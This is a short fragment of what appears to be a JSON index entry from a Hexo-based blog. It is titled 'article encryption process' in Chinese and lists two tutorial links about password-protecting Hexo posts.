文章加密过程\n\nhttp://www.shangyang.me/2016/12/16/hexo-base-concept/#hexo-%E5%8A%A0%E5%AF%86\n\nhttps://lxmymjr.github.io/contents/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B.html#%E5%8A%A0%E5%AF%86%E8%AE%BF%E9%97%AE","tags":["Hexo"],"categories":["Hexo 笔记"]}]